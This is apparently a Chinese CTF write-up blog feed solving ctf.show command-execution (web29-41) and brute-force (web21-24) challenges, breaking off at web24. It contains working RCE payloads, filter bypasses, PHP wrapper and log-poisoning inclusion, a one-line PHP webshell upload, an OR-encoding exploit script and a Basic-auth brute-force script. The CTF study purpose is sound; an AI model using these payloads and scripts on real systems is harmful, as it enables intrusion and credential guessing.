      <title>web29-41命令执行篇（一）</title>
      <link href="/posts/b5586866/"/>
      <url>/posts/b5586866/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>很简单的一道题。<code>?c=system(&quot;ls&quot;);</code>查看一下发现flag.php就在当前目录下，因为过滤了flag字节，所以直接用f*代替就行<br>payload：<code>?c=system(&quot;cat f*&quot;);</code><br>flag在源代码中。</p><h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul><li>除此之外，我们可以将文件复制一份修改为其他名字。</li></ul><p>payload：<code>?c=system(&quot;cp f* a.txt&quot;);</code><br>然后直接访问或者cat访问都可以获得flag。</p><ul><li><p>或者使用<code>tac</code>从后往前输出内容<br><code>c=system(&quot;tac f*&quot;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678683262006-674f9d23-a923-4232-b54e-03a16b60eacc.png" alt="image.png"></p></li><li><p>除了使用system函数执行，也可以使用内敛执行：<code>echo </code>命令<code> 比如`c=echo `tac f*</code></p></li><li><p>看了wp发现还有几种解法比如：利用参数输入+eval&#x2F;include</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&quot;ls%20&#x2F;&quot;);?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre></li><li><p>或者上传木马：<code>file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);</code></p></li><li><p>hint中使用了另一种命令和绕过：<code>nl fl&#39;&#39;ag.php</code></p></li></ul><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>cat打开后php文件不会显示在页面上，因此需要f12查看源代码。</p><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=echo </code>tac f*<code>;</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>空格过滤常用以下方法绕过：</p><pre class="language-php" data-language="php"><code class="language-php">cat flag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txt &#x2F;&#x2F;9改成其他数字也行cat&lt;flag.txtcat&lt;&gt;flag.txt&#123;cat,flag.txt&#125;cat%09flag.txtcat%20flag.txt &#x2F;&#x2F;这个这里好像不行</code></pre><p>payload：<code>?c=echo%09</code>tac%09f*<code>;</code></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678685067177-79d4d744-a673-436a-ac56-1be9a06a0803.png" alt="image.png"></p><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><blockquote><p><a href="https://ctf.show/writeups/865962">https://ctf.show/writeups/865962</a></p></blockquote><p>初次之外，wp中还有一种在log中注入木马的方式。在User-Agent<br>中写入木马<code>&lt;?php phpinfo();?&gt;</code>，在c中传入能正常访问的值，我们根据请求头可以判断出是nginx服务器，服务器的默认日志地址为：<code>/var/log/nginx/access.log </code>，再加上这里的include的字段，我们可以得到以下payload：<code>?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</code>，日志页面中出现phpinfo()页面，插入木马成功。</p><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;|\&#x2F;|[0-9]&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>过滤了数字，把1改为a就能接着用。<br>upload：<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web37-data伪协议文件名base64"><a href="#web37-data伪协议文件名base64" class="headerlink" title="web37 data伪协议文件名base64"></a>web37 data伪协议文件名base64</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>这回直接给你include，文件包含，不让出现flag字段，上来先想到data伪协议。<br>upload：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code><br>其中<code>PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code>是：<code>&lt;?php system(&quot;tac flag.php&quot;);&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678719387328-7c2f4056-1b4c-4999-9290-945a41c4ce13.png" alt="image.png"></p><h2 id="复习一下data伪协议的用法："><a href="#复习一下data伪协议的用法：" class="headerlink" title="复习一下data伪协议的用法："></a>复习一下data伪协议的用法：</h2><pre class="language-php" data-language="php"><code class="language-php">1、data:&#x2F;&#x2F;text&#x2F;plain,http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt; 2、data:&#x2F;&#x2F;text&#x2F;plain;base64,http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>继续使用上一题upload即可：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>upload：<code>?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;//</code><br>题目在include后面强加了<code>.php</code>我们只需要在语句中添加<code>//</code>注释掉末尾的字段即可。<br>但事实上，这道题不用管也可以，去掉<code>//</code>也是没问题的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678720477364-6e7e2ec6-9a53-45d0-9550-05fa59a7a617.png" alt="image.png"></p><h1 id="web40-禁止套娃（有·东西）"><a href="#web40-禁止套娃（有·东西）" class="headerlink" title="web40 禁止套娃（有·东西）"></a>web40 禁止套娃（有·东西）</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><h2 id="fuzz查看pregmatch剩余字符"><a href="#fuzz查看pregmatch剩余字符" class="headerlink" title="fuzz查看pregmatch剩余字符"></a>fuzz查看pregmatch剩余字符</h2><p>先fuzz一下剩下了哪些常用字符：（他看着过滤了括号，但实际上是中文里的括号。。。）</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  for($i &#x3D; 33; $i &lt;&#x3D; 126; $i++)&#123;  if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, chr($i)))&#123;  echo chr($i);  &#125;  &#125;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678722206004-f1d59aca-48dc-4732-a094-8bd2ad896196.png" alt="image.png"><br>看到结果思考了半天没有想法，看了看wp学到了新姿势：</p><h2 id="套娃解法"><a href="#套娃解法" class="headerlink" title="套娃解法"></a>套娃解法</h2><blockquote><p><a href="https://ctf.show/writeups/1002659">https://ctf.show/writeups/1002659</a><br><a href="https://blog.csdn.net/weixin_46250265/article/details/114266578">https://blog.csdn.net/weixin_46250265&#x2F;article&#x2F;details&#x2F;114266578</a><br><a href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p></blockquote><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>来自题目下方的hint：<br>upload：<code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br>分析一下是什么意思，先解释一下其中的各个函数都是什么意思。</p><pre class="language-php" data-language="php"><code class="language-php">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件pos()：返回数组中的当前元素的值。array_reverse()：数组逆序next()： 函数将内部指针指向数组中的下一个元素，并输出。highlight_file()：函数进行文件内容的读取，并输出</code></pre><p>var_dump一下localeconv()函数，第一个对应的值是<code>.</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678802966279-4fce3e4a-9652-4050-96bb-eabf4309afed.png" alt="image.png"><br>构造payload。首先是我们要输出列表下的所有文件：<br><code>print_r(scandir(&#39;.&#39;));</code>但是其中的点和单引号已经被过滤掉了，因此我们需要绕过一下，这就需要用到上面这个函数了（通过函数传参来获得）。所以想使用<code>localeconv()[&quot;decimal_point&quot;]</code>来获取到<code>.</code>但是双引号已经被过滤了。<br>这里有三个函数能够起到替代作用。</p><pre class="language-php" data-language="php"><code class="language-php">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos() 同 current() ,是current()的别名reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</code></pre><p>测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803619659-b2d38fe5-349a-4625-bcc9-161167344e25.png" alt="image.png"><br>这时候payload已经初具规模了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803689999-21e077e8-fcb2-43d7-a167-5d2f3d2a74e4.png" alt="image.png"><br>所以我们可以利用这段payload获取到当前文件夹的信息：<br><code>?c=var_dump(scandir(pos(localeconv())));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803871260-e3107088-3440-4dc7-a3ff-5ab5057ee454.png" alt="image.png"><br><em>当然这次是flag文件就在当前文件夹，如果不在当前文件夹需要使用：</em><code>_var_dump(scandir(&#39;../../&#39;));_</code><br>接下来的思路就是想办法获取到文件。我们可以使用<code>highlight_file()</code>函数（或者使用<code>show_source()</code>）来查看文件。然后就是索引，我们可以使用next、end函数等，以下为相关的方法。</p><pre class="language-php" data-language="php"><code class="language-php">current()返回数组中的当前元素的值。end()将内部指针指向数组中的最后一个元素，并输出。next()将内部指针指向数组中的下一个元素，并输出。prev()将内部指针指向数组中的上一个元素，并输出。reset()将内部指针指向数组中的第一个元素，并输出。each()返回当前元素的键名和键值，并将内部指针向前移动。</code></pre><p>但是flag文件不在头尾，所以我们可以使用array_reverse函数来倒转然后通过<code>next</code>函数来获取到文件。<br>至此payload就可以构建了：<code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>当然不可能只有这几个函数恰好能够满足条件。<br>比如说其中的pos函数可以被current、reset函数替换。<br>show_resource函数可以使用high_light函数来替换。<br>pos（localeconv（））的组合函数也可以被getcwd函数替换掉。（getcwd函数会返回当前所在文件夹）。</p><h3 id="方法二利用sessionid（好像不行）"><a href="#方法二利用sessionid（好像不行）" class="headerlink" title="方法二利用sessionid（好像不行）"></a>方法二利用sessionid（好像不行）</h3><p>利用sessionid来传参，但似乎传参也会被过滤，所以对这道题来说好像不太行…<br>upload：<code>?c=session_start();system(session_id());</code>，cookie修改为：<code>PHPSESSID=ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678806594280-0004a365-cdbd-46cd-b8b1-7691d0441e58.png" alt="image.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>首先是payload：<code>?c=eval(array_pop(next(get_defined_vars())));</code>除此之外需要用post传入<code>1=system(&#39;tac fl*&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807377877-48a49a97-d692-427b-b685-6132ebc2fd30.png" alt="image.png"><br>分析，先讲述一下各个函数的作用：</p><pre class="language-php" data-language="php"><code class="language-php">get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。next()将内部指针指向数组中的下一个元素，并输出。array_pop() 函数删除数组中的最后一个元素并返回其值。 </code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807006608-006af0ef-a25d-4623-bfb9-bcb58b1c5b0b.png" alt="image.png"><br>payload的含义就是在post中寻找到对应木马，并运行。、</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题真的有点东西，思路简单容易理解，但是难在如何找到返回这些需要参数的函数。</p><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;    $c &#x3D; $_POST[&#39;c&#39;];if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;        eval(&quot;echo($c);&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>查看一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678884677705-956c818c-49fd-4272-8ebf-a47e532af942.png" alt="image.png"><br>把字符都过滤掉了，觉得应该是用什么方法来替代字符，但是之后就没有思路了。</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p></blockquote><p>看了wp，发现想法没问题。<br>题目中特意提到了，上来先考虑的是：<strong>异或自增和取反</strong>构造字符都无法使用，但是留下了<code>|</code><br>wp提供了两个脚本：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123;     for ($j&#x3D;0; $j &lt;256 ; $j++) &#123;     if($i&lt;16)&#123;$hex_i&#x3D;&#39;0&#39;.dechex($i);&#125;else&#123;    $hex_i&#x3D;dechex($i);&#125;if($j&lt;16)&#123;    $hex_j&#x3D;&#39;0&#39;.dechex($j);&#125;else&#123;    $hex_j&#x3D;dechex($j);&#125;$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;    echo &quot;&quot;;&#125;else&#123;    $a&#x3D;&#39;%&#39;.$hex_i;$b&#x3D;&#39;%&#39;.$hex_j;$c&#x3D;(urldecode($a)|urldecode($b));if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;    $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;&#125;&#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行if(len(argv)!&#x3D;2):   print(&quot;&#x3D;&quot;*50)   print(&#39;USER：python exp.py &lt;url&gt;&#39;)   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)   print(&quot;&#x3D;&quot;*50)   exit(0)url&#x3D;argv[1]def action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))   data&#x3D;&#123;       &#39;c&#39;:urllib.parse.unquote(param)       &#125;   r&#x3D;requests.post(url,data&#x3D;data)   print(&quot;\n[*] result:\n&quot;+r.text)</code></pre><p>如果没有将php写入环境变量，就需要先运行rce_or.php生成文本，将文本置于与exp.py相同目录下，运行exp.py<br>使用方法：</p><pre class="language-python" data-language="python"><code class="language-python">python exp.py 你的对应url</code></pre><p>然后分贝在function参数和command参数添加你需要的参数。<br>比如system和ls。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678886696210-9bd0695d-c936-4068-86ac-77249e2e12e5.png" alt="image.png"></p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这部分题前面做着还算简单，直到40、41直接来了一个毁灭性打击。难度和前面的根本不是一个量级的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web21-28爆破篇</title>
      <link href="/posts/135509b6/"/>
      <url>/posts/135509b6/</url>
      
        <content type="html"><![CDATA[<h1 id="相关文章及参考资料"><a href="#相关文章及参考资料" class="headerlink" title="相关文章及参考资料"></a>相关文章及参考资料</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16053552.html"> 暴力破解(生成字典、爆破服务、爆破登录、解密、BurpSuite工具讲解) </a></p></blockquote><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p><del>做完了我才发现这些题的字典实在web21里面需要下载…</del></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><blockquote><p>爆破什么的，都是基操</p></blockquote><blockquote><p>burpsuite爆破：<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">https://www.cnblogs.com/007NBqaq/p/13220297.html</a></p></blockquote><p>直接展示登陆界面，随便输点什么，抓包，可以发现把账号密码放在了请求头中，并且根据末尾的&#x3D;&#x3D;可以看出是base64加密，因此我们直接尝试Intruder模块爆破。<br>原理我们都懂，但是我们该如何操作呢？</p><h2 id="方案一-burpsuite爆破"><a href="#方案一-burpsuite爆破" class="headerlink" title="方案一 burpsuite爆破"></a>方案一 burpsuite爆破</h2><p>将请求转入intruder，因为会拼接payload，所以使用基本的sniper类型就行，在payload sets里面修改payload tpe为<code>Custom Interator</code>，并且在payload option中按照顺序修改三个position。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726131628-7ca04364-333b-48e3-bdaf-bd5ff55d6c8f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726143875-172fd7f8-7d60-4f5c-8d79-57aec5d46650.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726152940-8e723666-ba55-4d24-8e87-9123771ee382.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726186298-73d9efbc-8154-40c3-b2f0-2ffdbccf833a.png" alt="image.png"><br>而且我们观察可以注意到，我们还需要将payload使用base64加密，因此在payload processing里面添加转换：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726245072-04e6ff20-acd9-45aa-a639-db4e41b833f7.png" alt="image.png"><br>最后再将末尾的转义关闭。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726288398-49c8a4bd-7ee2-4cb6-b38c-8c3cdb8614be.png" alt="image.png"><br>这种情况下爆破即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677727052915-6090cb47-a08f-4b1a-b670-0f34b353ce1d.png" alt="image.png"></p><h2 id="方案二-脚本爆破"><a href="#方案二-脚本爆破" class="headerlink" title="方案二 脚本爆破"></a>方案二 脚本爆破</h2><pre class="language-php" data-language="php"><code class="language-php"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-11-20 19:16:49# @Last Modified by:   h1xa# @Last Modified time: 2020-11-20 20:28:42# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comimport timeimport requestsimport base64url &#x3D; &#39;http:&#x2F;&#x2F;41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show&#x2F;index.php&#39;password &#x3D; []with open(&quot;1.txt&quot;, &quot;r&quot;) as f:  while True:    data &#x3D; f.readline()     if data:    password.append(data)    else:      break    for p in password:strs &#x3D; &#39;admin:&#39;+ p[:-1]header&#x3D;&#123;&#39;Authorization&#39;:&#39;Basic &#123;&#125;&#39;.format(base64.b64encode(strs.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;))&#125;rep &#x3D;requests.get(url,headers&#x3D;header)time.sleep(0.2)if rep.status_code &#x3D;&#x3D;200:print(rep.text)break</code></pre><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><blockquote><p>域名也可以爆破的，试试爆破这个ctf.show的子域名</p></blockquote><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><blockquote><p>还爆破？这么多代码，告辞！</p></blockquote><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 11:43:51# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);include(&#39;flag.php&#39;);if(isset($_GET[&#39;token&#39;]))&#123;    $token &#x3D; md5($_GET[&#39;token&#39;]);    if(substr($token, 1,1)&#x3D;&#x3D;&#x3D;substr($token, 14,1) &amp;&amp; substr($token, 14,1) &#x3D;&#x3D;&#x3D;substr($token, 17,1))&#123;        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))&#x2F;substr($token, 1,1)&#x3D;&#x3D;&#x3D;intval(substr($token, 31,1)))&#123;            echo $flag;        &#125;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>这题考的是脚本编写，直接使用脚本：</p><pre class="language-php" data-language="php"><code class="language-php">import hashlibdic &#x3D; &#39;0123456789qwertyuiopasdfghjklzxcvbnm&#39;for a in dic:    for b in dic:        t &#x3D; str(a) + str(b)        md5 &#x3D; hashlib.md5(t.encode()).hexdigest()        # print(md5)        # print(md5[1:2])        # print(md5[14:15])        # print(md5[17:18])        if md5[1:2] &#x3D;&#x3D; md5[14:15] and md5[14:15]&#x3D;&#x3D; md5[17:18]:            if (ord(md5[1:2])) &gt;&#x3D; 48 and ord(md5[1:2]) &lt;&#x3D; 57 and (ord(md5[14:15])) &gt;&#x3D; 48 and ord(md5[14:15]) &lt;&#x3D; 57:                if (ord(md5[17:18])) &gt;&#x3D; 48 and ord(md5[17:18]) &lt;&#x3D; 57 and (ord(md5[31:32])) &gt;&#x3D; 48 and ord(                        md5[31:32]) &lt;&#x3D; 57:                    if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) &#x2F; int(md5[1:2]) &#x3D;&#x3D; int(md5[31:32]):                        print(t)</code></pre><p>这里面我最开始写的时候没有12-14行，虽然会报错但是也能运行，wp中将其完善了一下。得到运行结果<code>3j</code><br>直接post传入即可得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677728759208-d504308e-6a04-47f2-a1ed-32f22148ac7c.png" alt="image.png"></p><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q：这里为什么分别用ord和int：<br>A：int改变数据类型，外型不变；ord改变数据类型，值不改变：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677729322819-fdd917cf-96e9-440e-9537-4ecd5ca16fe9.png" alt="20180517204019346.png"></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><blockquote><p>爆个🔨</p></blockquote><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:26:39# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 13:53:31# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#39;r&#39;]))&#123;    $r &#x3D; $_GET[&#39;r&#39;];    mt_srand(372619038);    if(intval($r)&#x3D;&#x3D;&#x3D;intval(mt_rand()))&#123;        echo $flag;    &#125;&#125;else&#123;    highlight_file(__FILE__);    echo system(&#39;cat &#x2F;proc&#x2F;version&#39;);&#125;?&gt;</code></pre><h2 id="方案一"><a href="#方案一" class="headerlink" 